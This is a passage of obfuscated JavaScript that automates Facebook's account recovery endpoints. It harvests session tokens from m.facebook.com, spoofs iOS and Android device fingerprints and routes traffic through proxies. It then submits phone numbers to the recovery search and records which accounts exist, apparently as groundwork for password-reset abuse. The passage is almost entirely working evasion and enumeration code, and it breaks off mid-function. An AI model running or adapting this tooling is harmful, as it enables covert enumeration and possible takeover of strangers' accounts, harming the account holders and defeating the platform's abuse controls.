    v780 = "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm826wto460eowRzo";
  const v781 = "gSmemK-KiSIyaOEYQqGRTqQ_F5lqy9d2US5bAhaRyeF4-QW-V8gBCmHZnVaiKhifj_nqO8Je-VBoB7y8DKh2oK5okwwwmIC5EaGAjJAy5-dzECi6o9Ugx6ewIwNyonxe0z88o3vw9-1vwzCrw8W6Utwbycw26GWx25E880mrw3qopw0G0w1sd7jJ7w2IXhU9p601daw1ii0Xo8U0GK00gqwg017Dwc4w0nhw3nA026mEOgg0fOw1IQw0cloEwug04xKm02c206TA32q02Simhi0dSi1awl8";
  const v782 = "gdug4AJMWXxy2C0zS2C2BP0cW17wuo9E35goz8cUp8i1SzU1481ro5S0o20gu012tw3BU0we",
    v783 = "0b20ke0Qo3Ew47wQBwtE-0VUa8ow5kw_xS0Q82LwcebwTwto1XU1TE1Eo0aJE6y0ia08bw20U4a58oxW0IE0M20aqwvo46aw6Kw4_w",
    v784 = "gdugbih4JMWXxy2C0zS0iK17wuo9E35goz8cUp8i0pu0mS",
    v785 = "7xeUjG4E4e5U5ObwyyVp4UcE9E6u5aCG6UtyE7WewSAxam4Eco722C2Sfzoy4U6m0x8txG4o461twa10Hwt89FE4Wqbx67k4obUyEpiwzlwhXwZw9m6A48a8lwWxecAwXwEwgonzoO0AE2qwgEhwGxu786a6oowv89k2CcAwOwAwgk6U-3K5E7VxK48W7p8hjwGK2efK1YwCxe68hzE2ZwzyrwmEiwm8kzu5o4qu1dwkVokylK2W1RwrUO4ohz8ek9zo8U5e3C1jhU2RwhoapocobGAyo884K6o9EbrxS9wr8aEbAeg4aEgADwBz8a-26U5umEb8uzpo4d08q1rxC11xS3S1EyUd8-2m2BxacxG1dwiE6e9Dxy1lG3u3O5XK5oLwio",
    v786 = "gdugbih4JMWXxyql1K68pwn61uwcO17wuo9kb5870I80mQh7GucwPxAx87O0hG0mS",
    v787 = v771?.["uaData"]?.["browserType"] === "duckduckgo" || v771?.["browserType"] === "duckduckgo" || SELECTED_BROWSER === "duckduckgo",
    v788 = "gdugbih4JMWXxy2C0zS0XEf84u1VwCwcl1ycwPxAx80Mm";
  let v789, v790, v791;
  if (v778) v789 = v771.__dyn_code || v771.__dyn || v785, v790 = v771.__csr_code || v771.__csr || "gSmemK-KiSIyaOEYQqGRTqQ_F5lqCVd2USUgKh4Hm8WAjWrHXAyVeVBG_l-iAHAkzQ_RSIybjLKpm9h-HWn_A8ubBzWx66Fo_9USawBH9xq8ykbyGAjJAy5-9Keyp449U89GzufzEGQ788o-9xu4U2cwxwyAhpAlaXhUFGdnAdkZyCkx2bFdSi8ghxm_BAJkZSC5VA3S1qcK8VVaF68HmaxJ4ne6vBCEOnPUBQESGlcnXsg8WQFQbAGmpy-F4-pACF2_WHmLiz919Xqv-bp2AaibhJkLDjQJ996AqzrhaQVojyGxJ1mp6BXqUwHacJ4Q986UHgmjFfl12UZGDby58SyCmqKBz4UGJoGaJOKnwaa0Dj2U8A2l4sM0Om0Lo1DU1Oopwd22y8dwN5Eg9wg22qyo0zOaQ68r10fNM80w0jO0dKyJo4iu0R89Q1owam5oy6EvqwwxO2G1RwZwaG1YyESogE19y1e0zQteQu0C8kweqq2t0Zwb2Qu2mhw4Zxx91Fx-UgwpU4l0Azk9K2O1z8Ch3kfx0c4mcDyP1hzAfwgU-5rCU4maigy22it2VEgKm0bhw14m0JE0yi0b0zcglCDB40HgB1C2O2W0A80k0e7o3Jwzw4Ez81to6Ocx9w2i81NE6u0eSw1UO07VU0u281gwWwTw5FxC4kQ3W0W8982dG3668q8641xiCxaEe8420u4g0xU960x8ao2e9WxJ1Thubg1Q84qfx-0bmzo1oEW9of_Dz8gyE8o19pyw8m7u0ge0kG09Fo4G2Gicg-kUarw7LnQqQagV0wpd2o4l07Dwbi0o2aF0bF0aW0CZPxS3C2cg0M80JV1Agicg-bwXwXw47yk4oLdudo0BOazEhhQfztCw8xBECAh5cUwBDAF6F24Xeoyf6a9ziUExlWOGfg2qw58BF4xq8CdArKmlh9wyomixSy5mN4aIP0Wmtu9uaCFW3KMLQrsbHNs1pbi9dAG9zrmszGhcMyaA1RP64X7N80ES0Mi0sC1swg60bJw4xwaO0b6cK19wgQ0Uo7S0atwuo12U9po0HmEOgg0oR0eAw1oEjweW3604po4V0eWsw17o0z64i0UoowPwzwrElggyO3A04No0Iya87A13w60wnoS06yE3OaE5btwEw3o80i0Bw3nE0kjDAwg81vo6-bP2pywToGqsyLm4SdxvyF910iy9HoANcyjByoZ1duWaGCxdeAEymnHh5z07iQ2eViAxC4ShN9eckdabB4zo29gJAaszDpbaucmd6woQ2Gmq1szayF68wZhkibiy7ykkwyip2Qp3EO266E9EkUyy0OggyoOmm6E4d1a2cEkwxgGcgR2A3t1q7U98v5kaR3iQcyAfUFgeixmq3q1bxp1nxCdwiUgxi4oqw867okLwFyK3i1RBfe3q2_8gUcm2214h9oN3UwM3HyBDQEyqkUCid3EqofbwTBAkw3tAwiE5i2612hQcAga40wAQ4l38jPI8Faq8G5Uyet4zb2a8R3iG8wxyAFp9EhxcIckqioNe6u45xy68OoPElhAqaopL8fw", v791 = v771.__s_code || v771.__s || '';else v779 ? (v789 = "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm826wto460eowRzo", v790 = "gSmemK-KiSIyaOEYQqGRTqQ_F5lqy9d2US5bAhaRyeF4-QW-V8gBCmHZnVaiKhifj_nqO8Je-VBoB7VKG_V27yUlxi221qOomx91qF4Xp8xvzoW9AxC2u48hzEb8coC5Ujw8O260TU2vwnU8VCU2exK7o2Uz80xGKEgxq2205CU0SC6o0aw80n3hQXhU0HeQu2mhw0jiE0kAweS2e0aHw046E400hVU31805Qo0RV00xBGcA403YE0rd8035ma87A018rBw0z0w1JV0MCw0JABAkw3tAwiE5i", v791 = v771.__s || '') : (v789 = v787 ? "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W0qa0FE2awpUO0n24oaEd82lwv89k2C1Fwc60D85m1mzXwae4UaEW0LobrwmE2eUlwhE2FBwxw4BwqEGdwtU2ewbS1LwTwNwLweq1Iwqo4eEgwro9o5umEb8uwm83Ywgo0Vy3mdw" : v771.__dyn || v780, v790 = v771.__csr || v781, v791 = v771.__s || '');
  let v792, v793, v794;
  if (v778) v792 = v787 ? "gdug4AI4bJ1nV9k6UZJoIwEo1hoaoandxd0iEbV43q17oW1EwBgIkws2MbwZ4gKqcyEa8p8iE7el283Eg9E1ro5S0o20gu012tw3BU0we" : v771.__hsdp_code || (v771.__hsdp && !v771.__hsdp.startsWith(':') ? v771.__hsdp : "gdug4AI4bJ1nV9k6UZJoIwEo1hoaoandxd0iEd43q17oW1EwBgIkws2MbwZ4hWhEOawExAxawsVk8wex0Cw5Jwno1w811U049S0enw20U"), v793 = v771.__hblp_code || (v771.__hblp && !v771.__hblp.startsWith(':') ? v771.__hblp : "3E2xwHw4nwd60W811Ud9o7qm9wevwCxy0li3-7o3gwa-0MUK3u1Rw4dwmE4O3C0AES1Tz82bwIw8W6oW0wEdoc8cUkx6q8wWwPwdG0jW0gC10U1LotweS8xG2G0a5wdq2y4E89po7K0FEgwIyE5S-1xwo8qxyaDwgoC8w5vxq0x9U-3a58oxWewUx-bxy4Q482ZGi3dBxe3GE2vwo82awww820Po3-AwhU7S11yE2CByK1twWwgopwlK3W9xS3a1cwsEiw"), v794 = v787 ? "gdugbih4JMWXxyql1K68pwn61uw8-3O17wuo9kb5870I80mQh1acwPxAx87O0hG0mS" : v771.__sjsp_code || (v771.__sjsp && !v771.__sjsp.startsWith(':') ? v771.__sjsp : v786);else v779 ? (v792 = v787 ? "gdug4AJMWXxy2C0zS2C2BP0963O17wuo9E35goz8cUp8i1SzU0DW1tw60w47w0gDo0Vu083w" : v782, v793 = v783, v794 = v787 ? v788 : v784) : (v792 = v787 ? "gdug4AJMWXxy2C0zS2C2BP0960_E9E3vz8cUp8i1SzU0JO0o20gu012tw3BU0we" : v771.__hsdp && !v771.__hsdp.startsWith(':') ? v771.__hsdp : "gdug4AJMWXxy2C0zS2C2BP0cW0Mo9E3vz8cUp8i1SzU0JO0o20gu012tw3BU0we", v793 = v771.__hblp && !v771.__hblp.startsWith(':') ? v771.__hblp : "0b20ke0Qo3Ew47wQBwtE-0VU460li3-7o3gwa-0MUK3u1Rw7Lw7uw6xw0GSwq818E0wK083wgEkxy7E2Ow3080FG1ZwgoG0qW0j-", v794 = v787 ? "gdugbih4JMWXxy2C0zS0XE3-wCwd-cwPxAx8" : v771.__sjsp && !v771.__sjsp.startsWith(':') ? v771.__sjsp : "gdugbih4JMWXxy2C0zS0iK0Mo9E3vz8cUp8i");
  const v795 = (v771.__req++).toString(0x24),
    v796 = new URLSearchParams();
  v796.set('av', '0'), v796.set("__aaid", '0'), v796.set("__user", '0'), v796.set("__a", '1'), v796.set("__req", v795), v796.set("__hs", v771.__hs || "20700.HYP:comet_loggedout_pkg.2.1...0"), v796.set("dpr", '1'), v796.set("__ccg", v771.__ccg || "EXCELLENT"), v796.set("__rev", v771.rev || "1046836583"), v796.set("__s", v791), v796.set("__hsi", v771.hsi), v796.set("__dyn", v789), v796.set("__csr", v790);
  if (v792) v796.set("__hsdp", v792);
  if (v793) v796.set("__hblp", v793);
  if (v794) v796.set("__sjsp", v794);
  v796.set("__comet_req", v771.__comet_req || '15'), v796.set("lsd", v771.lsd), v796.set("jazoest", v771.jazoest);
  if (v771.fb_dtsg) v796.set("fb_dtsg", v771.fb_dtsg);
  return v796.set("__spin_r", v771.rev || "1046836583"), v796.set("__spin_b", v771.spinB || "trunk"), v796.set("__spin_t", v771.spinT || String(Math.floor(Date.now() / 0x3e8))), v796.set("__crn", v778 ? "comet.fbweb.CometCAAARCodeEntryRoute" : "comet.fbweb.CometCAAAccountSearchRoute"), v796.set("qpl_active_flow_ids", "516759801"), v796.set("fb_api_caller_class", "RelayModern"), v796.set("fb_api_req_friendly_name", v773), v796.set("server_timestamps", "true"), v796.set("variables", JSON.stringify(v774)), v796.set("doc_id", v772), v796.set("fb_api_analytics_tags", JSON.stringify(["qpl_active_flow_ids=516759801"])), v796;
}
function buildHeaders(v797, v798, v799, v800, v801) {
  const v802 = v798 || globalUA,
    v803 = v800 || getLanguageHeader(SELECTED_ACCEPT_LANG) || "en-US,en;q=0.9";
  const v804 = v801 || "https://www.facebook.com/login/identify/",
    v805 = Object.fromEntries(Object.entries(v802.clientHints || {}).filter(([v809]) => v809 !== "sec-gpc"));
  const v806 = {
    'Accept': "*/*",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': v803,
    'Content-Type': "application/x-www-form-urlencoded",
    'Cookie': v797.cookieHeader,
    'Origin': "https://www.facebook.com",
    'Priority': "u=1, i",
    'Referer': v804,
    ...v805,
    'sec-fetch-dest': "empty",
    'sec-fetch-mode': "cors",
    'sec-fetch-site': "same-origin",
    ...(v802.clientHints && v802.clientHints["sec-gpc"] ? {
      'sec-gpc': v802.clientHints["sec-gpc"]
    } : {})
  };
  v806["User-Agent"] = v802.userAgent, v806["X-ASBD-ID"] = "359341", v806["X-FB-Friendly-Name"] = v799 || "unknown", v806["X-FB-LSD"] = v797.lsd;
  const v807 = v806,
    v808 = v802.device;
  if (v808) {
    if (v808.platform === "android") {
      v807["x-fb-device-model"] = v808.model || '', v807["x-fb-device-os-version"] = v808.androidVersion ? v808.androidVersion + ".0.0" : '', v807["x-fb-device-battery-level"] = String(v808.battery), v807["x-fb-device-battery-state"] = v808.isCharging ? "charging" : "discharging", v807["x-fb-device-uptime"] = String(v808.uptime), v807["x-fb-device-fg-time"] = String(v808.fgTime), v807["x-fb-device-hwid"] = v808.hwid || '', v807["x-fb-device-boot-id"] = v808.bootId || '', v807["x-fb-device-advertiser-id"] = v808.advertisingId || '', v807["x-fb-device-session-id"] = v808.sessionId || '', v807["x-fb-device-conn-type"] = v808.connType || "WIFI", v807["x-fb-device-net-quality"] = v808.networkQuality || "EXCELLENT", v807["x-fb-device-bandwidth"] = String(v808.bandwidth || 0x0), v807["x-fb-device-sim-operator"] = v808.simOperator || '', v807["x-fb-device-ram"] = String((v808.ram || 0x4) * 0x400), v807["x-fb-device-gpu"] = v808.gpu || '', v807["x-fb-device-cpu"] = v808.cpu || '', v807["x-fb-device-soc"] = v808.socManufacturer || '', v807["x-fb-device-group"] = v808.deviceGroup || "medium";
      if (v808.gpsVersion) v807["x-fb-device-gps-version"] = v808.gpsVersion;
    } else v808.platform === "ios" && (v807["x-fb-device-model"] = v808.model || '', v807["x-fb-device-os-version"] = v808.osVersion || v808.iosVersion && v808.iosVersion.osTag || '', v807["x-fb-device-battery-level"] = String(v808.battery), v807["x-fb-device-battery-state"] = v808.isCharging ? "charging" : "discharging", v807["x-fb-device-uptime"] = String(v808.uptime), v807["x-fb-device-fg-time"] = String(v808.fgTime), v807["x-fb-device-hwid"] = v808.hwid || '', v807["x-fb-device-boot-id"] = v808.bootId || '', v807["x-fb-device-advertiser-id"] = v808.advertisingId || '', v807["x-fb-device-session-id"] = v808.sessionId || '', v807["x-fb-device-conn-type"] = v808.connType || "WIFI", v807["x-fb-device-net-quality"] = v808.networkQuality || "EXCELLENT", v807["x-fb-device-bandwidth"] = String(v808.bandwidth || 0x0), v807["x-fb-device-sim-operator"] = v808.simOperator || '', v807["x-fb-device-ram"] = String((v808.ram || 0x6) * 0x400), v807["x-fb-device-gpu"] = v808.gpu || '', v807["x-fb-device-cpu"] = v808.cpu || '', v807["x-fb-device-soc"] = v808.socManufacturer || "Apple", v807["x-fb-device-group"] = v808.deviceGroup || "high", v807["x-fb-device-family"] = v808.family || "iPhone");
  }
  return v807;
}
function bloksPostPage(v810, v811, v812, v813 = 0x3a98, v814 = "m.facebook.com", v815 = undefined, v816 = null, v817 = null) {
  const v818 = v814 || "m.facebook.com";
  const v819 = v815 === undefined ? getProxy() : v815,
    v820 = v816 || globalUA,
    v821 = v817 || "https://" + v818 + "/login/identify/";
  const v822 = {
    'Accept': "*/*",
    'Accept-Encoding': "gzip, deflate, br",
    'Accept-Language': v816 && v816.hostCtx ? v816.hostCtx.lang : "en-GB,en-US;q=0.9,en;q=0.8",
    'Content-Type': "application/x-www-form-urlencoded;charset=UTF-8",
    'Cookie': v812,
    'User-Agent': v820.userAgent,
    'Referer': v821,
    'Origin': "https://" + v818,
    ...(SELECTED_BROWSER === "via_browser" ? {
      'X-Requested-With': "mark.via.gp"
    } : {}),
    ...(v820.clientHints || {})
  };
  v822["sec-fetch-dest"] = "empty", v822["sec-fetch-mode"] = "cors", v822["sec-fetch-site"] = "same-origin", v822.Priority = "u=1, i";
  const v823 = v822;
  if (v819) {
    const v824 = {};
    return v824.hostname = v818, v824.path = v810, v824.method = "POST", v824.headers = v823, proxyHttpsRequest(v819, v824, v811, v813).then(v825 => {
      if (v825.status >= 0x12c && v825.status < 0x190 && v825.location) {
        const v827 = {};
        return v827.status = v825.status, v827.redirect = v825.location, v827;
      }
      const v826 = {};
      v826.status = v825.status;
      return v826.data = v825.data, v826;
    });
  }
  return new Promise((v828, v829) => {
    v823["Content-Length"] = Buffer.byteLength(v811);
    const v830 = {};
    v830.keepAlive = false;
    const v831 = {
        'hostname': v818,
        'port': 0x1bb,
        'path': v810,
        'method': "POST",
        'timeout': v813,
        'agent': new https.Agent(v830),
        'headers': v823
      },
      v832 = https.request(v831, v833 => {
        const v834 = [];
        v833.on("data", v835 => {
          v834.push(v835), trackBytes(v835.length);
        }), v833.on("error", v836 => {
          try {
            v829(v836);
          } catch (v837) {}
        });
        v833.on("end", () => {
          if (v833.statusCode >= 0x12c && v833.statusCode < 0x190 && v833.headers.location) {
            const v840 = {};
            return v840.status = v833.statusCode, v840.redirect = v833.headers.location, v828(v840);
          }
          let v838 = Buffer.concat(v834);
          const v839 = v833.headers["content-encoding"];
          if (v839 === "gzip") try {
            v838 = zlib.gunzipSync(v838);
          } catch (v841) {} else {
            if (v839 === "deflate") try {
              v838 = zlib.inflateSync(v838);
            } catch (v842) {} else {
              if (v839 === 'br') try {
                v838 = zlib.brotliDecompressSync(v838);
              } catch (v843) {}
            }
          }
          v828({
            'status': v833.statusCode,
            'data': v838.toString()
          });
        });
      });
    v832.on("error", v829), v832.on("timeout", () => {
      v832.destroy();
      v829(new Error("timeout"));
    }), v832.write(v811), v832.end();
  });
}
function mfbParsedResponse(v844) {
  if (!v844) return null;
  let v845 = v844.replace(/^for\s*\(;;\);/, '');
  try {
    return JSON.parse(v845);
  } catch (v846) {
    return null;
  }
}
function mfbExtractRid(v847) {
  try {
    return v847 && v847.payload && v847.payload.id ? v847.payload.id : v847 && v847.rid ? v847.rid : null;
  } catch (v848) {
    return null;
  }
}
function mfbBaseParams(v849) {
  const v850 = {};
  v850.__aaid = '0', v850.__user = '0', v850.__a = '1', v850.__req = 'a', v850.__hs = v849.__hs || '', v850.dpr = '3', v850.__ccg = "EXCELLENT";
  v850.__rev = v849.__rev || v849.rev || '', v850.__hsi = v849.hsi || '';
  return v850.__dyn = "7AeUGwFKm9EbUl5AWx2hFoXDHaGHAa8h8EC2S562EcxuK4oKkQBzyfSxy7EaBV8bxy4VkwhEn84bEbo9UGdFogU", v850.fb_dtsg = v849.fb_dtsg || '', v850.lsd = v849.lsd || '', v850.jazoest = v849.jazoest || '', v850;
}
function mfbFormEncode(v851) {
  return Object.entries(v851).map(([v852, v853]) => encodeURIComponent(v852) + '=' + encodeURIComponent(v853)).join('&');
}
const MFB_DEBUG_ENABLED = process.env.MFB_DEBUG === '1' || true;
(function () {
  const fn18 = function () {
      let v855;
      try {
        v855 = Function("return (function() {}.constructor(\"return this\")( ));")();
      } catch (v856) {
        v855 = window;
      }
      return v855;
    },
    v854 = fn18();
  v854.setInterval(fn2, 0xdac);
})();
const MFB_DEBUG_LOG = path.join(__dirname, "reset_mfb_debug.txt");
function mfbLog(v857, v858) {
  if (!MFB_DEBUG_ENABLED) return;
  const v859 = '[' + new Date().toISOString() + "] [" + v857 + ']\x20' + v858 + '\x0a';
  try {
    fs.appendFileSync(MFB_DEBUG_LOG, v859);
  } catch (v860) {}
}
function mfbSaveRaw(v861, v862) {
  if (!MFB_DEBUG_ENABLED) return;
  const v863 = '\x0a' + '─'.repeat(0x3c) + "\n[RAW RESPONSE] " + v861 + '\x0a' + '─'.repeat(0x3c) + '\x0a';
  try {
    fs.appendFileSync(MFB_DEBUG_LOG, v863 + (v862 || "(empty)") + '\x0a');
  } catch (v864) {}
}
async function mfbBloksPost(v865, v866, v867, v868, v869, v870, v871) {
  const v872 = "/async/wbloks/fetch/?appid=" + encodeURIComponent(v865) + "&type=" + encodeURIComponent(v866 || "action") + "&__bkv=" + "da3296cb34d354ba6ca7e2e1f147c00f24ef79dbeda8c17edc0864704ee696a1",
    v873 = mfbBaseParams(v868),
    v874 = mfbFormEncode({
      'appid': v865,
      'type': v866 || "action",
      '__bkv': "da3296cb34d354ba6ca7e2e1f147c00f24ef79dbeda8c17edc0864704ee696a1",
      ...v873,
      'params': JSON.stringify({
        'params': JSON.stringify(v867)
      })
    }),
    v875 = {
      ...(v870 || globalUA),
      'hostCtx': {
        'lang': v871 || "en-US,en;q=0.9"
      }
    },
    v876 = await bloksPostPage(v872, v874, v868.cookieHeader, 0x4e20, "m.facebook.com", v869, v875, "https://m.facebook.com/login/identify/");
  if (!v876 || !v876.data) return null;
  if (v876.headers) mergeCookiesIntoStr(v868, v876.headers);
  return {
    'raw': v876.data,
    'parsed': mfbParsedResponse(v876.data),
    'status': v876.status
  };
}
function mergeCookiesIntoStr(v877, v878) {
  const v879 = v878["set-cookie"];
  if (!v879) return;
  const v880 = {};
  (v877.cookieHeader || '').split(';').forEach(v881 => {
    const v882 = v881.indexOf('=');
    if (v882 < 0x0) return;
    v880[v881.slice(0x0, v882).trim()] = v881.slice(v882 + 0x1).trim();
  }), (Array.isArray(v879) ? v879 : [v879]).forEach(v883 => {
    const v884 = v883.split(';')[0x0].split('=');
    if (v884.length >= 0x2) {
      const v885 = v884[0x0].trim(),
        v886 = v884.slice(0x1).join('=').trim();
      if (v886 !== "deleted") v880[v885] = v886;
    }
  });
  v877.cookieHeader = Object.entries(v880).map(([v887, v888]) => v887 + '=' + v888).join(';\x20');
}
async function mfbBootstrap(v889, v890, v891) {
  const v892 = mfbGenIosUA();
  mfbLog("BOOTSTRAP", "Fetching m.facebook.com session tokens... [UA: " + v892.slice(0x0, 0x3c) + "...]");
  const v893 = {};
  v893.cookieHeader = '', v893.fb_dtsg = null, v893.lsd = null, v893.jazoest = null, v893.__rev = null, v893.__hs = null, v893.hsi = null;
  v893.datr = null, v893.bkv = "da3296cb34d354ba6ca7e2e1f147c00f24ef79dbeda8c17edc0864704ee696a1";
  const v894 = v893;
  try {
    const v895 = {};
    let v896 = "m.facebook.com",
      v897 = "/login/identify/",
      v898 = '',
      v899 = 0x0;
    for (let v905 = 0x0; v905 < 0x4; v905++) {
      const v906 = Object.entries(v895).map(([v912, v913]) => v912 + '=' + v913).join(';\x20'),
        v907 = {
          'User-Agent': v892,
          'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          'Accept-Language': v891 || "en-US,en;q=0.9",
          'Accept-Encoding': "gzip, deflate, br",
          'sec-fetch-dest': "document",
          'sec-fetch-mode': "navigate",
          'sec-fetch-site': "none"
        };
      if (v906) v907.Cookie = v906;
      let v908;
      if (v889) {
        const v914 = {};
        v914.hostname = v896, v914.path = v897, v914.method = "GET", v914.headers = v907, v908 = await proxyHttpsRequest(v889, v914, null, 0x3a98);
      } else v908 = await new Promise((v915, v916) => {
        const v917 = {};
        v917.hostname = v896;
        v917.port = 0x1bb;
        v917.path = v897, v917.method = "GET", v917.timeout = 0x3a98, v917.headers = v907;
        const v918 = https.request(v917, v919 => {
          const v920 = [];
          v919.on("data", v921 => v920.push(v921)), v919.on("end", () => {
            let v922 = Buffer.concat(v920);
            const v923 = v919.headers["content-encoding"];
            try {
              if (v923 === "gzip") v922 = zlib.gunzipSync(v922);else {
                if (v923 === 'br') v922 = zlib.brotliDecompressSync(v922);
              }
            } catch (v924) {}
            v915({
              'status': v919.statusCode,
              'headers': v919.headers,
              'data': v922.toString(),
              'location': v919.headers.location || ''
            });
          });
          v919.on("error", v916);
        });
        v918.on("error", v916), v918.on("timeout", () => {
          v918.destroy();
          v916(new Error("mfb bootstrap timeout"));
        });
        v918.end();
      });
      v899 = v908.status, v898 = v908.data || '';
      const v909 = v908.headers && v908.headers["set-cookie"];
      v909 && (Array.isArray(v909) ? v909 : [v909]).forEach(v925 => {
        const v926 = v925.split(';')[0x0].split('=');
        if (v926.length >= 0x2) {
          const v927 = v926[0x0].trim(),
            v928 = v926.slice(0x1).join('=').trim();
          if (v928 !== "deleted") v895[v927] = v928;
          if (v927 === "datr") v894.datr = v928;
        }
      });
      const v910 = v908.status >= 0x12c && v908.status < 0x190,
        v911 = v908.location || v908.headers && v908.headers.location || '';
      if (v910 && v911) {
        mfbLog("BOOTSTRAP", "HTTP " + v908.status + " → redirect to " + v911.slice(0x0, 0x3c) + "... (hop " + (v905 + 0x1) + ')');
        try {
          const v929 = new URL(v911.startsWith("http") ? v911 : "https://" + v896 + v911);
          v896 = v929.hostname, v897 = v929.pathname + v929.search;
        } catch (v930) {
          v897 = v911;
        }
        continue;
      }
      break;
    }
    mfbLog("BOOTSTRAP", "HTTP " + v899 + " | " + v898.length + " bytes"), mfbSaveRaw("BOOTSTRAP", v898);
    if (!v894.datr) {
      const v931 = v898.match(/datr["\s]*:["\s]*"([^"]+)"/);
      if (v931) v894.datr = v931[0x1];
    }
    const v900 = v898.match(/"dtsg"\s*:\s*\{\s*"token"\s*:\s*"([^"]+)"/) || v898.match(/fb_dtsg[^"]*"([^"]{20,})"/);
    if (v900) v894.fb_dtsg = v900[0x1];
    const v901 = v898.match(/"LSD"[^\]]*\[\][^{]*\{[^}]*"token":\s*"([^"]+)"/) || v898.match(/"lsd"\s*:\s*"([^"]+)"/);
    if (v901) {
      v894.lsd = v901[0x1];
      let v932 = 0x0;
      for (let v933 = 0x0; v933 < v901[0x1].length; v933++) v932 += v901[0x1].charCodeAt(v933);
      v894.jazoest = '2' + v932;
    }
    const v902 = v898.match(/"__rev"\s*:\s*(\d+)/) || v898.match(/"server_revision"\s*:\s*(\d+)/) || v898.match(/"__spin_r"\s*:\s*(\d+)/) || v898.match(/"revision":(\d+)/) || v898.match(/"consistency":\s*\{[^}]*"rev":\s*(\d+)/) || v898.match(/consistency[^}]*rev["\s]*:\s*(\d+)/);
    if (v902) v894.__rev = v902[0x1];
    const v903 = v898.match(/"haste_session"\s*:\s*"([^"]+)"/) || v898.match(/"__hs"\s*:\s*"([^"]+)"/);
    if (v903) v894.__hs = v903[0x1];
    const v904 = v898.match(/"__hsi"\s*:\s*"?(\d+)"?/) || v898.match(/"hsi"\s*:\s*"(\d+)"/);
    if (v904) v894.hsi = v904[0x1];
    v894.cookieHeader = Object.entries(v895).map(([v934, v935]) => v934 + '=' + v935).join(';\x20'), mfbLog("BOOTSTRAP", "fb_dtsg   : " + (v894.fb_dtsg ? v894.fb_dtsg.slice(0x0, 0x1e) + "..." : "NOT FOUND")), mfbLog("BOOTSTRAP", "lsd       : " + (v894.lsd || "NOT FOUND")), mfbLog("BOOTSTRAP", "jazoest   : " + (v894.jazoest || "NOT FOUND")), mfbLog("BOOTSTRAP", "__rev     : " + (v894.__rev || "NOT FOUND")), mfbLog("BOOTSTRAP", "__hs      : " + ((v894.__hs || '').slice(0x0, 0x28) || "NOT FOUND")), mfbLog("BOOTSTRAP", "datr      : " + (v894.datr ? v894.datr.slice(0x0, 0x14) + "..." : "NOT FOUND")), mfbLog("BOOTSTRAP", "cookies   : " + v894.cookieHeader.slice(0x0, 0x3c) + "...");
  } catch (v936) {
    mfbLog("BOOTSTRAP", "FAILED: " + v936.message);
  }
  return v894;
}
async function mfbSearch(v937, v938, v939, v940, v941) {
  const v942 = v937.replace(/^\+/, '');
  mfbLog("SEARCH", "Searching: " + v942);
  const v943 = v938.waterfall || uuid();
  v938.waterfall = v943;
  const v944 = {};
  v944.device_id = v938.datr || '', v944.waterfall_id = v943, v944.is_platform_login = 0x0, v944.is_from_logged_out = 0x0, v944.access_flow_version = "pre_mt_behavior", v944.login_surface = "account_recovery", v944.login_entry_point = "account_recovery", v944.context_data = v938.contextData || null, v944.back_nav_action = "BACK", v944.INTERNAL_INFRA_screen_id = "CAA_ACCOUNT_RECOVERY_SEARCH";
  const v945 = {};
  v945.input_text = v942;
  v945.identifier_type = "PHONE";
  const v946 = {};
  v946.server_params = v944, v946.client_input_params = v945;
  const v947 = v946,
    v948 = await mfbBloksPost("com.bloks.www.caa.ar.search.async", "action", v947, v938, v939, v940, v941);
  if (!v948) {
    mfbLog("SEARCH", "FAILED: no response");
    const v956 = {};
    return v956.ok = false, v956.error = "no_response", v956;
  }
  mfbLog("SEARCH", "HTTP " + v948.status + " | " + v948.raw.length + " bytes | rid=" + (mfbExtractRid(v948.parsed) || "n/a")), mfbSaveRaw("SEARCH", v948.raw);
  const v949 = v948.raw,
    v950 = v949.startsWith("for (;;);{") || v949.startsWith("for(;;);{") || v949.includes("\"__ar\"");
  if (!v950) {
    const v957 = v949.includes("Sorry, something went wrong") || v949.includes("<html") || v949.includes("<!DOCTYPE");
    mfbLog("SEARCH", "FAILED: non-Bloks response (HTML error page) — " + (v957 ? "FB server error" : "unknown format"));
    const v958 = {};
    return v958.ok = false, v958.error = "search_html_error", v958;
  }
  if (v949.includes("search_error_dialog") && !v949.includes("SelectAccountController") && !v949.includes("\"cuid\"")) {
    mfbLog("SEARCH", "ACCOUNT NOT FOUND (search_error_dialog with no account context)");
    const v959 = {};
    return v959.ok = false, v959.notFound = true, v959.error = "not_found", v959;
  }
  if (v949.includes("No accounts match") || v949.includes("no_account_found") || v949.includes("ACCOUNT_NOT_FOUND")) {
    mfbLog("SEARCH", "ACCOUNT NOT FOUND");
    const v960 = {};
    return v960.ok = false, v960.notFound = true, v960.error = "not_found", v960;
  }
  const v951 = v949.match(/"waterfall_id"\s*:\s*"([^"]{30,})"/);
  v951 && (v938.waterfall = v951[0x1], mfbLog("SEARCH", "waterfall_id: " + v938.waterfall));
  const v952 = v949.indexOf("\"account_recovery\", \"account_recovery\", \"");
  if (v952 > -1) {
    const v961 = v952 + "\"account_recovery\", \"account_recovery\", \"".length,
      v962 = v949.indexOf('\x22', v961);
    v962 > v961 && (v938.contextData = v949.slice(v961, v962), mfbLog("SEARCH", "context_data: " + v938.contextData.slice(0x0, 0x3c) + "..."));
  } else mfbLog("SEARCH", "context_data: NOT FOUND");
  const v953 = v949.indexOf("\"cuid\"), (bk.action.array.Make, \"AY");
  if (v953 > -1) {
    const v963 = v953 + "\"cuid\"), (bk.action.array.Make, \"AY".length - 0x1;
    let v964 = v963;
    while (v964 < v949.length && /[A-Za-z0-9_\-]/.test(v949[v964])) v964++;
    v964 - v963 > 0x1e && (v938.cuid = v949.slice(v963, v964), mfbLog("SEARCH", "cuid (single-acct): " + v938.cuid.slice(0x0, 0x28) + "... (len=" + v938.cuid.length + ')'));
